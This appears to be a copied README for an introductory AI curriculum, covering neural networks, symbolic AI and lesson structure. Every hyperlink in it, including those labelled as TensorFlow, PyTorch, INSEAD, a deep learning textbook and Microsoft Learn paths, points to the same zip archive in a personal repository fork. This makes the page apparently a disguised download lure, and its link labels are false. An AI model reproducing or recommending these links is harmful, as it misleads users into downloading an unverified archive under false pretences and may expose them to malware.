# Artificial Intelligence for Beginners - A Curriculum

|![ Sketchnote by [(@girlie_mac)](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) ](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip)|

Explore the world of **Artificial Intelligence** (AI) with our 12-week, 24-lesson curriculum!  It includes practical lessons, quizzes, and labs. The curriculum is beginner-friendly and covers tools like TensorFlow and PyTorch, as well as ethics in AI

## What you will learn

**[Mindmap of the Course](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip)**

In this curriculum, you will learn:

* Different approaches to Artificial Intelligence, including the "good old" symbolic approach with **Knowledge Representation** and reasoning ([GOFAI](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip)).
* **Neural Networks** and **Deep Learning**, which are at the core of modern AI. We will illustrate the concepts behind these important topics using code in two of the most popular frameworks - [TensorFlow](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) and [PyTorch](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip).
* **Neural Architectures** for working with images and text. We will cover recent models but may be a bit lacking in the state-of-the-art.
* Less popular AI approaches, such as **Genetic Algorithms** and **Multi-Agent Systems**.

What we will not cover in this curriculum:

> [Find all additional resources for this course in our Microsoft Learn collection](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip)

* Business cases of using **AI in Business**. Consider taking [Introduction to AI for business users](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) learning path on Microsoft Learn, or [AI Business School](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip), developed in cooperation with [INSEAD](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip).
* **Classic Machine Learning**, which is well described in our [Machine Learning for Beginners Curriculum](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip).
* Practical AI applications built using **[Cognitive Services](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip)**. For this, we recommend that you start with modules Microsoft Learn for [vision](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip), [natural language processing](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip), **[Generative AI with Azure OpenAI Service](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip)** and others.
* Specific ML **Cloud Frameworks**, such as [Azure Machine Learning](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip), [Microsoft Fabric](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip), or [Azure Databricks](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip). Consider using [Build and operate machine learning solutions with Azure Machine Learning](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) and [Build and Operate Machine Learning Solutions with Azure Databricks](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) learning paths.
* **Conversational AI** and **Chat Bots**. There is a separate [Create conversational AI solutions](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) learning path, and you can also refer to [this blog post](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) for more detail.
* **Deep Mathematics** behind deep learning. For this, we would recommend [Deep Learning](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) by Ian Goodfellow, Yoshua Bengio and Aaron Courville, which is also available online at [https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip).

For a gentle introduction to _AI in the Cloud_ topics you may consider taking the [Get started with artificial intelligence on Azure](https://github.com/divish9123/AI-For-Beginners/raw/refs/heads/main/translations/ru/For-Beginners-A-v2.2.zip) Learning Path.

## Each lesson contains

* Pre-reading material
* Executable Jupyter Notebooks, which are often specific to the framework (**PyTorch** or **TensorFlow**). The executable notebook also contains a lot of theoretical material, so to understand the topic you need to go through at least one version of the notebook (either PyTorch or TensorFlow).
* **Labs** available for some topics, which give you an opportunity to try applying the material you have learned to a specific problem.
